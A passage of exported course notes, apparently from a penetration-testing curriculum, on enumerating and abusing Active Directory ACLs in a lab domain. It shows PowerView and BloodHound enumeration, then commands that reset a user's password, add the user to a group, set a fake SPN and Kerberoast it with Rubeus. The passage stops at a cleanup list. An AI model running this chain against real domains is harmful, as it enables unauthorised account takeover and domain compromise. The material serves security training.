enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.|\n|`Excessive user rights`|We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.|\n\nThere are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.\n\n**Note:** Some ACL attacks can be considered \"destructive,\" such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/21-ACL Enumeration",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/21-ACL Enumeration.md",
    "title": "21 ACL Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Let's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be ...",
    "category": "02_CPTS",
    "content": "\n---\n\nLet's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be leveraged to gain us further access in the internal environment.\n\n---\n\n## Enumerating ACLs with PowerView\n\nWe can use PowerView to enumerate ACLs, but the task of digging through _all_ of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function `Find-InterestingDomainAcl` we will receive a massive amount of information back that we would need to dig through to make any sense of:\n\n#### Using Find-InterestingDomainAcl\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Find-InterestingDomainAcl\n\nObjectDN                : DC=INLANEFREIGHT,DC=LOCAL\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : ExtendedRight\nObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b\nAceFlags                : ContainerInherit\nAceType                 : AccessAllowedObject\nInheritanceFlags        : ContainerInherit\nSecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189\nIdentityReferenceName   : Exchange Windows Permissions\nIdentityReferenceDomain : INLANEFREIGHT.LOCAL\nIdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security \n                          Groups,DC=INLANEFREIGHT,DC=LOCAL\nIdentityReferenceClass  : group\n\nObjectDN                : DC=INLANEFREIGHT,DC=LOCAL\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : ExtendedRight\nObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529\nAceFlags                : ContainerInherit\nAceType                 : AccessAllowedObject\nInheritanceFlags        : ContainerInherit\nSecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189\nIdentityReferenceName   : Exchange Windows Permissions\nIdentityReferenceDomain : INLANEFREIGHT.LOCAL\nIdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security \n                          Groups,DC=INLANEFREIGHT,DC=LOCAL\nIdentityReferenceClass  : group\n\n<SNIP>\n```\n\nIf we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user `wley`, which we obtained after solving the last question in the `LLMNR/NBT-NS Poisoning - from Linux` section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Import-Module .\\PowerView.ps1\nPS C:\\htb> $sid = Convert-NameToSid wley\n```\n\nWe can then use the `Get-DomainObjectACL` function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us _who_ has the given right over an object. One important thing to note is that if we search without the flag `ResolveGUIDs`, we will see results like the below, where the right `ExtendedRight` does not give us a clear picture of what ACE entry the user `wley` has over `damundsen`. This is because the `ObjectAceType` property is returning a GUID value that is not human readable.\n\nNote that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.\n\n#### Using Get-DomainObjectACL\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n\nObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176\nActiveDirectoryRights  : ExtendedRight\nObjectAceFlags         : ObjectAceTypePresent\nObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529\nInheritedObjectAceType : 00000000-0000-0000-0000-000000000000\nBinaryLength           : 56\nAceQualifier           : AccessAllowed\nIsCallback             : False\nOpaqueLength           : 0\nAccessMask             : 256\nSecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181\nAceType                : AccessAllowedObject\nAceFlags               : ContainerInherit\nIsInherited            : False\nInheritanceFlags       : ContainerInherit\nPropagationFlags       : None\nAuditFlags             : None\n```\n\nWe could Google for the GUID value `00299570-246d-11d0-a768-00aa006e0529` and uncover [this](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.\n\nNote that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session.\n\n#### Performing a Reverse Search & Mapping to a GUID Value\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> $guid= \"00299570-246d-11d0-a768-00aa006e0529\"\nPS C:\\htb> Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n\nName              : User-Force-Change-Password\nDisplayName       : Reset Password\nDistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL\nrightsGuid        : 00299570-246d-11d0-a768-00aa006e0529\n```\n\nThis gave us our answer, but would be highly inefficient during an assessment. PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`.\n\n#### Using the -ResolveGUIDs Flag\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n\nAceQualifier           : AccessAllowed\nObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : User-Force-Change-Password\nObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176\nInheritanceFlags       : ContainerInherit\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : ContainerInherit\nInheritedObjectAceType : All\nOpaqueLength           : 0\n```\n\n`Why did we walk through this example when we could have just searched using ResolveGUIDs first?`\n\nIt is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) and [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.\n\nThis example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:\n\n#### Creating a List of Domain Users\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt\n```\n\nWe then read each line of the file using a `foreach` loop, and use the `Get-Acl` cmdlet to retrieve ACL information for each domain user by feeding each line of the `ad_users.txt` file to the `Get-ADUser` cmdlet. We then select just the `Access property`, which will give us information about access rights. Finally, we set the `IdentityReference` property to the user we are in control of (or looking to see what rights they have), in our case, `wley`.\n\n#### A Useful foreach Loop\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n\nPath                  : Microsoft.ActiveDirectory.Management.dll\\ActiveDirectory:://RootDSE/CN=Dana \n                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nInheritanceType       : All\nObjectType            : 00299570-246d-11d0-a768-00aa006e0529\nInheritedObjectType   : 00000000-0000-0000-0000-000000000000\nObjectFlags           : ObjectAceTypePresent\nAccessControlType     : Allow\nIdentityReference     : INLANEFREIGHT\\wley\nIsInherited           : False\nInheritanceFlags      : ContainerInherit\nPropagationFlags      : None\n```\n\nOnce we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.\n\nSo, to recap, we started with the user `wley` and now have control over the user `damundsen` via the `User-Force-Change-Password` extended right. Let's use Powerview to hunt for where, if anywhere, control over the `damundsen` account could take us.\n\n#### Further Enumeration of Rights Using damundsen\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> $sid2 = Convert-NameToSid damundsen\nPS C:\\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n\nAceType               : AccessAllowed\nObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022\nInheritanceFlags      : ContainerInherit\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176\nAccessMask            : 131132\nAuditFlags            : None\nAceFlags              : ContainerInherit\nAceQualifier          : AccessAllowed\n```\n\nNow we can see that our user `damundsen` has `GenericWrite` privileges over the `Help Desk Level 1` group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.\n\nLet's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the `Help Desk Level 1` group is nested into the `Information Technology` group, meaning that we can obtain any rights that the `Information Technology` group grants to its members if we just add ourselves to the `Help Desk Level 1` group where our user `damundsen` has `GenericWrite` privileges.\n\n#### Investigating the Help Desk Level 1 Group with Get-DomainGroup\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof\n\nmemberof                                                                      \n--------                                                                      \nCN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n```\n\nThis is a lot to digest! Let's recap where we're at:\n\n- We have control over the user `wley` whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value\n- We enumerated objects that the user `wley` has control over and found that we could force change the password of the user `damundsen`\n- From here, we found that the `damundsen` user can add a member to the `Help Desk Level 1` group using `GenericWrite` privileges\n- The `Help Desk Level 1` group is nested into the `Information Technology` group, which grants members of that group any rights provisioned to the `Information Technology` group\n\nNow let's look around and see if members of `Information Technology` can do anything interesting. Once again, doing our search using `Get-DomainObjectACL` shows us that members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could:\n\n- Modify group membership\n- Force change a password\n- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak\n\n#### Investigating the Information Technology Group\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> $itgroupsid = Convert-NameToSid \"Information Technology\"\nPS C:\\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose\n\nAceType               : AccessAllowed\nObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : GenericAll\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164\nInheritanceFlags      : ContainerInherit\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016\nAccessMask            : 983551\nAuditFlags            : None\nAceFlags              : ContainerInherit\nAceQualifier          : AccessAllowed\n\n```\n\nFinally, let's see if the `adunn` user has any type of interesting access that we may be able to leverage to get closer to our goal.\n\n#### Looking for Interesting Access\n\nACL Enumeration\n\n```powershell-session\nPS C:\\htb> $adunnsid = Convert-NameToSid adunn \nPS C:\\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose\n\nAceQualifier           : AccessAllowed\nObjectDN               : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set\nObjectSID              : S-1-5-21-3842939050-3880317879-2865463114\nInheritanceFlags       : ContainerInherit\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : ContainerInherit\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\nAceQualifier           : AccessAllowed\nObjectDN               : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : DS-Replication-Get-Changes\nObjectSID              : S-1-5-21-3842939050-3880317879-2865463114\nInheritanceFlags       : ContainerInherit\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : ContainerInherit\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\n<SNIP>\n```\n\nThe output above shows that our `adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the `DCSync` section.\n\n---\n\n## Enumerating ACLs with BloodHound\n\nNow that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool. Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound. Next, we can set the `wley` user as our starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`. If we click on the `1` next to `First Degree Object Control`, we see the first set of rights that we enumerated, `ForceChangePassword` over the `damundsen` user.\n\n#### Viewing Node Info through BloodHound\n\n![BloodHound interface showing node info for WLEY@INLANEFREIGHT.LOCALl with execution and control rights, connected to DAMUNDSEN@INLANEFREIGHT.LOCAL via ForceChangePassword.](https://academy.hackthebox.com/storage/modules/143/wley_damundsen.png)\n\nIf we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:\n\n- More info on the specific right, tools, and commands that can be used to pull off this attack\n- Operational Security (Opsec) considerations\n- External references.\n\nWe'll dig into this menu more later on.\n\n#### Investigating ForceChangePassword Further\n\n![Popup window in BloodHound showing ForceChangePassword capability for WLEY@INLANEFREIGHT.LOCAL to change DAMUNDSEN@INLANEFREIGHT.LOCAL's password without knowing the current password.](https://academy.hackthebox.com/storage/modules/143/help_edge.png)\n\nIf we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.\n\n#### Viewing Potential Attack Paths through BloodHound\n\n![BloodHound graph showing WLEY@INLANEFREIGHT.LOCAL's connections to various groups and users, including CONTRACTORS, FILE SHARE, and DOMAIN USERS, with relationships like MemberOf and ForceChangePassword.](https://academy.hackthebox.com/storage/modules/143/wley_path.png)\n\nFinally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.\n\n#### Viewing Pre-Build queries through BloodHound\n\n![BloodHound graph showing ADUNN@INLANEFREIGHT.LOCAL's connections to various groups and users, including DOMAIN ADMINS and ENTERPRISE DOMAIN CONTROLLERS, with relationships like MemberOf and GetChangesAll.](https://academy.hackthebox.com/storage/modules/143/adunn_dcsync.png)\n\nWe've now enumerated these attack paths in multiple ways. The next step will be performing this attack chain from start to finish. Let's dig in!",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/22-ACL Abuse Tactics",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/22-ACL Abuse Tactics.md",
    "title": "22 ACL Abuse Tactics",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Abusing ACLs Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky ...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Abusing ACLs\n\nOnce again, to recap where we are and where we want to get to. We are in control of the `wley` user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the `adunn` user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:\n\n1. Use the `wley` user to change the password for the `damundsen` user\n2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group\n3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user\n\nSo, first, we must authenticate as `wley` and force change the password of the user `damundsen`. We can start by opening a PowerShell console and authenticating as the `wley` user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).\n\n#### Creating a PSCredential Object\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force\nPS C:\\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n```\n\nNext, we must create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.\n\n#### Creating a SecureString Object\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n```\n\nFinally, we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password. We need to use the `-Credential` flag with the credential object we created for the `wley` user. It's best to always specify the `-Verbose` flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as `pth-net`, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).\n\n#### Changing the User's Password\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> cd C:\\Tools\\\nPS C:\\htb> Import-Module .\\PowerView.ps1\nPS C:\\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'\nVERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset\n```\n\nWe can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the `wley` user that we control. Next, we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.\n\n#### Creating a SecureString Object using damundsen\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nPS C:\\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n```\n\nNext, we can use the [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the `pth-toolkit`.\n\n#### Adding damundsen to the Help Desk Level 1 Group\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members\n\nCN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nCN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n```\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'\n```\n\nA quick check shows that our addition to the group was successful.\n\n#### Confirming damundsen was Added to the Group\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n\nMemberName\n----------\nbusucher\nspergazed\n\n<SNIP>\n\ndamundsen\ndpayne\n```\n\nAt this point, we should be able to leverage our new group membership to take control over the `adunn` user. Now, let's say that our client permitted us to change the password of the `damundsen` user, but the `adunn` user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.\n\nWe must be authenticated as a member of the `Information Technology` group for this to be successful. Since we added `damundsen` to the `Help Desk Level 1` group, we inherited rights via nested group membership. We can now use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.\n\n#### Creating a Fake SPN\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential\nVERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string:\n(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))\nVERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'\n```\n\nIf this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.\n\n#### Kerberoasting with Rubeus\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : adunn\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n\n[*] SamAccountName         : adunn\n[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n[*] ServicePrincipalName   : notahacker/LEGIT\n[*] PwdLastSet             : 3/1/2022 11:29:08 AM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>\n```\n\nGreat! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack, which we will cover in the next section.\n\n---\n\n## Cleanup\n\nIn terms of cleanup, there are a few things we need to do:\n\n1. 